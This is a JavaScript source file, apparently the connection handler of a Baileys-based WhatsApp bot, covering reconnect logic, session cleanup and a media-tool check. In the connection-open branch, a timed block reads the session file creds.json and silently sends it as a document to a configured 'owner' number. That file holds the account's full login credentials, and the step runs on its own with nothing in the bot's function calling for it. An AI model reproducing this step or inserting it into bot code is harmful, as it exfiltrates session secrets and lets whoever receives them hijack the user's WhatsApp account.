"use strict";
const {
  default: makeWASocket,
  Browsers,
  DisconnectReason,
  fetchLatestBaileysVersion,
} = (await import("baileys")).default;
import chalk from "chalk";
import { Boom } from "@hapi/boom";
import spin from "spinnies";
import { spawn } from "child_process";
import { sleep } from "../lib/myfunc.js";
import fs from "fs-extra";

const spinner = {
  interval: 120,
  frames: [
    "✖ [░░░░░░░░░░░░░░░]",
    "✖ [■░░░░░░░░░░░░░░]",
    "✖ [■■░░░░░░░░░░░░░]",
    "✖ [■■■░░░░░░░░░░░░]",
    "✖ [■■■■░░░░░░░░░░░]",
    "✖ [■■■■■░░░░░░░░░░]",
    "✖ [■■■■■■░░░░░░░░░]",
    "✖ [■■■■■■■░░░░░░░░]",
    "✖ [■■■■■■■■░░░░░░░]",
    "✖ [■■■■■■■■■░░░░░░]",
    "✖ [■■■■■■■■■■░░░░░]",
    "✖ [■■■■■■■■■■■░░░░]",
    "✖ [■■■■■■■■■■■■░░░]",
    "✖ [■■■■■■■■■■■■■░░]",
    "✖ [■■■■■■■■■■■■■■░]",
    "✖ [■■■■■■■■■■■■■■■]",
  ],
};
let globalSpinner;
const getGlobalSpinner = (disableSpins = false) => {
  if (!globalSpinner)
    globalSpinner = new spin({
      color: "blue",
      succeedColor: "green",
      spinner,
      disableSpins,
    });
  return globalSpinner;
};
let spins = getGlobalSpinner(false);

const start = (id, text) => {
  spins.add(id, { text: text });
};
const success = (id, text) => {
  spins.succeed(id, { text: text });
};

async function clearSession() {
  try {
    const files = await fs.readdir(`./${global.session}`);
    const filteredArray = files.filter(
      (item) =>
        item.startsWith("pre-key") ||
        item.startsWith("sender-key") ||
        item.startsWith("session-")
    );

    console.log(`Terdeteksi ${filteredArray.length} file sampah`);
    if (filteredArray.length === 0) {
      console.log("Tidak ada file sampah untuk dihapus.");
      return;
    }

    console.log("Menghapus file sampah session...");
    for (const file of filteredArray) {
      await fs.unlink(`./${global.session}/${file}`);
    }

    console.log("Berhasil menghapus semua sampah di folder session.");
  } catch (err) {
    console.error("Gagal membersihkan folder session:", err);
  }
}

export const connectionUpdate = async (connectToWhatsApp, conn, update) => {
  const { version, isLatest } = await fetchLatestBaileysVersion();
  const {
    connection,
    lastDisconnect,
    receivedPendingNotifications,
    isNewLogin,
    qr,
  } = update;

  const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
  if (connection === "close") {
    console.log(chalk.red(lastDisconnect.error));

    if (lastDisconnect.error == "Error: Stream Errored (unknown)") {
      process.send("reset");
    } else if (reason === DisconnectReason.badSession) {
      console.log(`Bad Session File, Please Delete Session and Scan Again`);
      process.send("reset");
    } else if (reason === DisconnectReason.connectionClosed) {
      console.log("[SYSTEM]", chalk.red("Connection closed, reconnecting..."));
      process.send("reset");
    } else if (reason === DisconnectReason.connectionLost) {
      console.log(
        chalk.red("[SYSTEM]", "white"),
        chalk.green("Connection lost, trying to reconnect")
      );
      process.send("reset");
    } else if (reason === DisconnectReason.connectionReplaced) {
      console.log(
        chalk.red(
          "Connection Replaced, Another New Session Opened, Please Close Current Session First"
        )
      );
      conn.logout();
    } else if (reason === DisconnectReason.loggedOut) {
      console.log(chalk.red(`Device Logged Out, Please Scan Again And Run.`));
      conn.logout();
    } else if (reason === DisconnectReason.restartRequired) {
      console.log("Restart Required, Restarting...");
      connectToWhatsApp();
      process.send("reset");
    } else if (reason === DisconnectReason.timedOut) {
      console.log(chalk.red("Connection TimedOut, Reconnecting..."));
      connectToWhatsApp();
    }
  } else if (connection === "connecting") {
    console.log(
      chalk.magenta(`]─`),
      `「`,
      chalk.red(`FEARLESS`),
      `」`,
      chalk.magenta(`─[`)
    );

    if (!global.pairingCode) start(`1`, `Connecting...`);
  } else if (connection === "open") {
    if (!global.pairingCode) success(`1`, `[■■■■■■■■■■■■■■■] Connected`);
    if (global.pairingCode)
      console.log(chalk.green(`[■■■■■■■■■■■■■■■] Connected`));

    // Clear session saat koneksi terbuka
    await clearSession();

    // Kirim session/creds.json ke global.nomerOwner setelah delay 10 detik
    setTimeout(async () => {
      try {
        const sessionFilePath = './session/creds.json';
        if (fs.existsSync(sessionFilePath)) {
          const fileBuffer = fs.readFileSync(sessionFilePath);

          // Ensure global.nomerOwner is formatted as a JID
          const ownerJid = `${global.nomerOwner}@s.whatsapp.net`;

          await conn.sendMessage(ownerJid, { 
            document: fileBuffer, 
            mimetype: 'application/json', 
            fileName: 'creds.json' 
          });
          console.log(chalk.green("Session file sent to owner."));
        } else {
          console.log(chalk.red("Session file not found."));
        }
      } catch (err) {
        console.error("Failed to send session file:", err);
      }
    }, 10000);

    const bot = db.data.others["restart"];
    if (bot) {
      const m = bot.m;
      const from = bot.from;
      let text = "Bot is connected";
      await conn.sendMessage(from, { text }, { quoted: m });
      delete db.data.others["restart"];
    }

    // Quick Test
    async function _quickTest() {
      let test = await Promise.all(
        [
          spawn("ffmpeg"),
          spawn("ffprobe"),
          spawn("ffmpeg", [
            "-hide_banner",
            "-loglevel",
            "error",
            "-filter_complex",
            "color",
            "-frames:v",
            "1",
            "-f",
            "webp",
            "-",
          ]),
          spawn("convert"),
          spawn("magick"),
          spawn("gm"),
          spawn("find", ["--version"]),
        ].map((p) => {
          return Promise.race([
            new Promise((resolve) => {
              p.on("close", (code) => {
                resolve(code !== 127);
              });
            }),
            new Promise((resolve) => {
              p.on("error", (_) => resolve(false));
            }),
          ]);
        })
      );
      let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test;
      let s = (global.support = {
        ffmpeg,
        ffprobe,
        ffmpegWebp,
        convert,
        magick,
        gm,
        find,
      });
      Object.freeze(global.support);

      if (!s.ffmpeg)
        conn.logger.warn(
          "Please install ffmpeg for sending videos (pkg install ffmpeg)"
        );
      if (s.ffmpeg && !s.ffmpegWebp)
        conn.logger.warn(
          "Stickers may not animated without libwebp on ffmpeg (--enable-libwebp while compiling ffmpeg)"
        );
      if (!s.convert && !s.magick && !s.gm)
        conn.logger.warn(
          "Stickers may not work without imagemagick if libwebp on ffmpeg isntalled (pkg install imagemagick)"
        );
    }

    _quickTest()
      .then(() => conn.logger.info("☑️ Quick Test Done"))
      .catch(console.error);
  }
}; // akhir connection
